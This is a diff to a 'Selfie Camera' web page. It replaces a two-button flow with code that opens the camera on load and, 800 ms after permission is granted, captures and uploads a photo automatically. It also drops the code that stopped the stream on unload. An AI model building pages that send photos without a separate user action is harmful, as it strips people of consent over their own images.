@@ -5,57 +5,58 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Selfie Camera</title>
 <style>
-body{margin:0;padding:20px;background:#111;color:#fff;font-family:Arial;text-align:center}
-video{width:100%;max-width:500px;border-radius:12px;margin:15px auto;display:block}
-button{padding:13px 20px;margin:6px;border:0;border-radius:8px;font-size:16px;cursor:pointer}
-#start{background:#2196f3;color:#fff}
-#send{background:#4caf50;color:#fff}
-button:disabled{opacity:.5}
-#message{color:#ccc}
+body{font-family:Arial,sans-serif;background:#111;color:#fff;text-align:center;margin:0;padding:24px}
+video{width:min(100%,520px);border-radius:14px;background:#222;transform:scaleX(-1)}
+#status{margin:16px 0}
 </style>
 </head>
 <body>
-<h1>Selfie Camera</h1>
-<p id="message">Press Start Camera and allow camera access.</p>
-<video id="video" autoplay playsinline></video>
-<button id="start">Start Camera</button>
-<button id="send" disabled>Take &amp; Send Photo</button>
+<h2>Selfie Camera</h2>
+<div id="status">Requesting camera permission…</div>
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas" hidden></canvas>
 
 <script>
 const video = document.getElementById("video");
-const start = document.getElementById("start");
-const send = document.getElementById("send");
-const message = document.getElementById("message");
-let stream;
+const status = document.getElementById("status");
+const canvas = document.getElementById("canvas");
 
-start.onclick = async () => {
+async function startCamera() {
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      throw new Error("Camera API unavailable");
+    }
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: "user" } },
       audio: false
     });
+
     video.srcObject = stream;
-    start.disabled = true;
-    send.disabled = false;
-    message.textContent = "Camera ready. Press Take & Send Photo.";
-  } catch (e) {
-    console.error(e);
-    message.textContent = "Camera permission was denied or the camera is unavailable.";
+    await video.play();
+
+    status.textContent = "Camera ready — taking photo…";
+    // small delay so the stream has a moment to stabilize before capture
+    setTimeout(takeAndSendPhoto, 800);
+  } catch (error) {
+    status.textContent = "Camera permission was denied or unavailable.";
   }
-};
+}
 
-send.onclick = async () => {
-  if (!stream) return;
+async function takeAndSendPhoto() {
+  status.textContent = "Taking and sending photo…";
 
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
+  const width = video.videoWidth || 1280;
+  const height = video.videoHeight || 720;
+  canvas.width = width;
+  canvas.height = height;
 
-  send.disabled = true;
-  message.textContent = "Sending photo...";
+  const ctx = canvas.getContext("2d");
+  ctx.translate(width, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0, width, height);
 
-  canvas.toBlob(async blob => {
+  canvas.toBlob(async (blob) => {
     try {
       const form = new FormData();
       form.append("photo", blob, "selfie.jpg");
@@ -65,24 +66,16 @@ send.onclick = async () => {
         body: form
       });
 
-      const result = await response.json();
+      if (!response.ok) throw new Error("Upload failed");
 
-      if (!response.ok || !result.ok) {
-        throw new Error(result.error || "Upload failed");
-      }
-
-      message.textContent = "Photo sent successfully.";
-    } catch (e) {
-      console.error(e);
-      message.textContent = "Could not send the photo. Please try again.";
-      send.disabled = false;
+      status.textContent = "Photo sent successfully.";
+    } catch (error) {
+      status.textContent = "Could not send the photo.";
     }
   }, "image/jpeg", 0.9);
-};
+}
 
-window.addEventListener("beforeunload", () => {
-  if (stream) stream.getTracks().forEach(track => track.stop());
-});
+startCamera();
 </script>
 </body>
 </html>
